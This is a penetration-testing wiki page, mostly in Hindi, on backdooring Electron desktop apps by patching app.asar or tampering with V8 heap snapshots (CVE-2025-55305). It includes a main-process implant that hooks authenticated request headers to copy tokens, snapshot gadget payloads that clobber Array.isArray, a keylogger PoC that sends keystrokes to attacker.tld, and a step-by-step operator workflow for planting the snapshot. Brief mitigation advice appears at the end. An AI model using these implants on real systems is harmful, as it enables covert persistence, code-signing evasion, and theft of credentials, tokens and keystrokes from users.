# Electron Local Code Injection and Snapshot Tampering

{{#include ../../banners/hacktricks-training.md}}

## Electron Local Code Injection

यदि आप locally installed Electron application को modify या instrument कर सकते हैं, तो आप उससे arbitrary JavaScript execute करवा सकते हैं। देखें:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Local Node inspector या Chromium DevTools debugging surface के लिए, [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) देखें।

## Post-exploitation: ASAR/main-process implants

यदि आपको Electron app की resources directory में **write access** मिल जाता है, तो post-exploitation का एक बेहद व्यावहारिक तरीका है **`app.asar`** (या इसके द्वारा load किए जाने वाले JS entrypoint) को **patch करना** और उपयोगकर्ता के app को फिर से launch करने की प्रतीक्षा करना। केवल renderer तक सीमित XSS के विपरीत, **main process** से load किया गया code app के **Node.js runtime** में execute होता है, इसलिए यह आमतौर पर **filesystem** तक पहुंच सकता है, commands spawn कर सकता है, Electron APIs को hook कर सकता है और authenticated application state की जांच कर सकता है।<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

आम workflow:

1. `app.asar` को extract करें और `package.json` (`main`) या मौजूदा startup logic से वास्तविक bootstrap file पहचानें।
2. **main process** में एक छोटा loader जोड़ें (या preload/main-process hook का उपयोग करें) और archive को दोबारा pack करें।
3. Application के दोबारा start होने की प्रतीक्षा करें और उपयोगकर्ता द्वारा desktop app को unlock या authenticate करने के बाद runtime data capture करने के लिए implant का उपयोग करें।

न्यूनतम bootstrap patch का उदाहरण:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

व्यावहारिक प्रभाव:

- **विश्वसनीय क्लाइंट से डेटा चोरी**: डेस्कटॉप ऐप द्वारा उपयोगकर्ता के लिए डेटा decrypt या load किए जाने के बाद, implant उसे runtime से पढ़ सकता है। इसी वजह से **E2EE messaging clients** (Signal/Slack/Mattermost) और **vault/secret managers** endpoint layer पर अब भी दिलचस्प targets हैं।
- **Session/token का दुरुपयोग**: Electron implants ऐप cookies, bearer tokens, request headers, workspace files या running client के सामने उजागर repo credentials चुरा सकते हैं (उदाहरण के लिए, authenticated VS Code extensions या Git integrations)।
- **Victim-context pivoting**: patched app, केवल raw tokens exfiltrate करने के बजाय, victim workstation के ज़रिए requests proxy कर सकता है और victim IP, TLS fingerprint तथा application session का दोबारा उपयोग कर सकता है।

> [!NOTE]
> अगर target **ASAR integrity** / **OnlyLoadAppFromAsar** या hardened Electron **fuses** enable करता है, तो आपको कोई अलग local code-loading primitive (उदाहरण के लिए, fuse abuse या snapshot tampering) चाहिए हो सकता है। अधिक local implant विकल्पों और fuse विवरण के लिए macOS-specific injection page देखें।

## V8 heap snapshot tampering के ज़रिए local backdooring (Electron/Chromium) – CVE-2025-55305

Electron और Chromium-based apps, हर V8 isolate (main, preload, renderer) को initialize करने के लिए startup पर पहले से बना V8 heap snapshot (`v8_context_snapshot.bin`, और वैकल्पिक रूप से `browser_v8_context_snapshot.bin`) deserialize करते हैं। ऐतिहासिक रूप से, Electron के integrity fuses इन snapshots को executable content नहीं मानते थे, इसलिए वे fuse-based integrity enforcement और OS code-signing checks—दोनों से बच निकलते थे। नतीजतन, user-writable installation में snapshot को बदलने से signed binaries या ASAR को संशोधित किए बिना, app के अंदर stealthy और persistent code execution संभव था।<sup>[[2]](#references)</sup>

मुख्य बिंदु
- Integrity gap: EnableEmbeddedAsarIntegrityValidation और OnlyLoadAppFromAsar, ASAR के अंदर मौजूद app JavaScript को validate करते हैं, लेकिन वे V8 heap snapshots को cover नहीं करते थे (CVE-2025-55305)। Chromium भी snapshots की integrity जाँच नहीं करता।<sup>[[3]](#references)[[4]](#references)</sup>
- Attack की पूर्वशर्तें: app की installation directory में local file write access। यह उन systems पर आम है जहाँ Electron apps या Chromium browsers user-writable paths में install होते हैं (जैसे, Windows पर %AppData%\Local; macOS पर कुछ शर्तों के साथ /Applications)।
- प्रभाव: अक्सर उपयोग होने वाले builtin (“gadget”) को clobber करके किसी भी isolate में attacker JavaScript का भरोसेमंद execution, जिससे persistence और code-signing verification से बचना संभव होता है।
- प्रभावित सतह: Electron apps (fuses enable होने पर भी) और Chromium-based browsers, जो user-writable locations से snapshots load करते हैं।

Chromium build किए बिना malicious snapshot बनाना
- Payload JS को snapshot में compile करने और application के `v8_context_snapshot.bin` को overwrite करने के लिए prebuilt electron/mksnapshot का उपयोग करें।<sup>[[5]](#references)[[6]](#references)</sup>

उदाहरण के लिए minimal payload (crash कराकर execution साबित करें)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-aware payload routing (main और renderer में अलग-अलग code चलाना)
- Main process detection: process.pid, process.binding(), या process.dlopen जैसे Node-only globals, main process isolate में मौजूद होते हैं।
- Browser/renderer detection: alert जैसे Browser-only globals, document context में चलने पर उपलब्ध होते हैं।

ऐसे gadget का उदाहरण जो main-process की Node capabilities को एक बार probe करता है
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

Renderer/browser-context डेटा चोरी PoC (जैसे, Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Operator workflow
1) `payload.js` लिखें, जो किसी common builtin (जैसे `Array.isArray`) को clobber करे और वैकल्पिक रूप से isolate के अनुसार branch करे।
2) Chromium sources के बिना snapshot build करें:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Target application की snapshot file(s) को overwrite करें:
   - v8_context_snapshot.bin (हमेशा उपयोग की जाती है)
   - browser_v8_context_snapshot.bin (यदि LoadBrowserProcessSpecificV8Snapshot fuse का उपयोग किया जाता है)
4) Application launch करें; चुने हुए builtin के उपयोग पर gadget execute होता है।

Notes and considerations
- Integrity/signature bypass: Code-signing checks snapshot files को native executables नहीं मानते और (ऐतिहासिक रूप से) वे Electron fuses या Chromium integrity controls के दायरे में नहीं थीं।
- Persistence: User-writable install में snapshot को बदलने पर यह आम तौर पर app restarts के बाद भी बना रहता है और app signed तथा legitimate दिखाई देता है।
- Chromium browsers: यही tampering concept user-writable locations में install किए गए Chrome/derivatives पर भी लागू होता है। Chrome में अन्य integrity mitigations हैं, लेकिन वह अपने threat model से स्पष्ट रूप से physically local attacks को बाहर रखता है।<sup>[[9]](#references)[[10]](#references)</sup>

Detection and mitigations
- Snapshots को executable content मानें और integrity enforcement में शामिल करें (CVE-2025-55305 fix)।
- केवल admin-writable install locations को प्राथमिकता दें; v8_context_snapshot.bin और browser_v8_context_snapshot.bin के hashes का baseline बनाएं और monitor करें।
- Early-runtime builtin clobbering और अप्रत्याशित snapshot changes का पता लगाएं; जब deserialized snapshots अपेक्षित values से मेल न खाएं, तो alert करें।

## References

- [1] [JS-Tap v3: JavaScript Implants के ज़रिए Endpoint Post-Exploitation](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Code integrity checks को दरकिनार करके Signal, 1Password, Slack और अन्य apps में स्थानीय रूप से backdoor डालना](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Unsigned code की loading को disable करना (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome security FAQ: physically local attacks दायरे से बाहर](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
